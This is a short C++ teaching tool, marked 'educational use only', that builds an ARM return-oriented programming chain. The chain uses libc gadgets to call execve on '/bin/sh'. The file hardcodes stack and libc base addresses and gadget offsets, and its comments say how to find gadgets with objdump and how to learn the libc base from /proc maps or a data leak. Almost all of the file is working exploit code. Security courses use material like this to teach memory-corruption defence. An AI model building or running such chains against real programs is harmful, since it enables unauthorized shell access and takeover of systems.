/*
 Tool to bake a functional ROP gadget for ARM

 Orion Lawlor, lawlor@alaska.edu, 2020-11-23 (educational use only)
*/
#include <stdio.h>
#include <vector>

// This is the address in memory where our stack landed
long stack_top=0x7eacd1f4;
long stack_offset=0x1C; // jump from stack top to our data

// This is the address where libc's r-xp code area starts in memory
//  You can get this from /proc/<pid>/maps, or a data leak.
long libc_base=0x76bc9000;

/*
This is the libc-relative offset to our "pop_registers" gadget
You can find these gadgets by disassemblying libc using objdump -dr
   d4514:       e8bd880f        pop     {r0, r1, r2, r3, fp, pc}
*/
long gadget_pop=0xd4514;

/*
This is the libc-relative offset to our "execve" gadget
*/
long gadget_execve=0x9f818;


int main() {
	std::vector<long> rop; // stack contents go here

	// Top of the stack: pop gadget
	rop.push_back(libc_base+gadget_pop);

	// This will pop  {r0, r1, r2, r3, fp, pc}
	rop.push_back(stack_top+stack_offset); // r0 = address of "/bin/sh"
	rop.push_back(0); // r1 = argv, zero for none
	rop.push_back(0); // r2 = envp, zero for none
	rop.push_back(3); // r3, don't care
	rop.push_back(4); // fp, don't care

	// Next entry in rop chain: execv gadget
	rop.push_back(libc_base+gadget_execve);

	// We put our string data down here
	rop.push_back(0x6e69622f); // == ASCII "/bin"
	rop.push_back(0x0068732f); // == ASCII "/sh" and terminator

	// Print the gadget!
	for (int i=0;i<(int)rop.size();i++)
		printf("0x%lx ",rop[i]);
	printf(" stop\n");

	return 0;
}

